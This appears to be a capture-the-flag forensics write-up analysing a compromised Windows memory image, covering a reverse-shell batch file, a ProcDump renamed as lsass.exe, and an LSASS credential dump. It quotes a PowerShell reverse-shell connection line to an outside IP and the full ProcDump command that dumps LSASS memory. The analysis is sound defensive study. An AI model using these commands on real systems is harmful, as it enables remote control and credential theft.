# File Artifact Analysis

**Case ID:** 006  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## 1. Objective

Recover and analyze malicious file artifacts identified in memory and determine their role in the compromise.

## 2. Identified Malicious Files

| File | Path | Purpose |
|------|------|----------|
| svchost.bat | C:\Windows\System32\svchost.bat | Reverse shell / C2 script |
| lsass.exe (masqueraded) | C:\Windows\lsass.exe | Renamed ProcDump |
| lsass.dmp | C:\Windows\lsass.dmp | LSASS credential dump |

## 3. svchost.bat Analysis

### Discovery Method

- Located via `strings_out.txt`
- Timeline confirmed via `mftparser`

**Command used**:

`python vol.py -f memory.dmp --profile=Win10x64_17763 mftparser --output-file=mftparser.json`

**Creation Time (UTC)**:

`2023-02-03 13:25:04`

**Embedded Behavior**

Recovered string (defanged):

`$client = New-Object System.Net.Sockets.TCPClient('10.0.128.2',4337);`

**Behavior summary**:

- Establishes outbound TCP connection
- Executes received commands via iex
- Sends output back to remote host
- Implements interactive reverse shell

## 4. Masqueraded LSASS Binary
Identified via `psxview` and `cmdline`.

**Command line**:

"C:\Windows\lsass.exe" -accepteula -ma 656 lsass.dmp

**Analysis**:
- Path differs from legitimate LSASS
- Accepts EULA automatically
- Uses -ma full memory dump switch
- Targets legitimate LSASS PID (656)
- Drops output file lsass.dmp

**Conclusion**:

Renamed Sysinternals ProcDump used for credential dumping.

## 5. LSASS Dump Artifact
**Dump target**:

- `PID: 656` (legitimate LSASS)

**Output file**:

- `lsass.dmp`

**Forensic Implication**:
- Offline credential extraction likely possible
- Potential credential compromise across domain or local accounts
- High-severity impact

## 6. Artifact Timeline Correlation
| Time (UTC) | Artifact |
| :--- | :--- |
| 13:23:40 | PowerShell execution begins |
| 13:25:04 | `svchost.bat` created |
| 13:29:30 | Masqueraded `lsass.exe` executed |
| 13:29:33 | Memory captured |

## 7. MITRE ATT&CK Mapping
| Technique | ID | Evidence |
| :--- | :--- | :--- |
| **Command Shell** | T1059.003 | `svchost.bat` reverse shell |
| **Credential Dumping** | T1003.001 | LSASS memory dump |
| **Masquerading** | T1036 | Renamed `lsass.exe` binary |
| **Ingress Tool Transfer** | T1105 | Reverse shell C2 |

## 8. File Artifact Conclusion
- **Malicious File Creation**: Confirmed
- **Credential Dump Generated**: Confirmed
- **Reverse Shell Script**: Confirmed
- **Masquerading Behavior**: Confirmed

File artifacts directly support credential theft and active command-and-control activity.


---
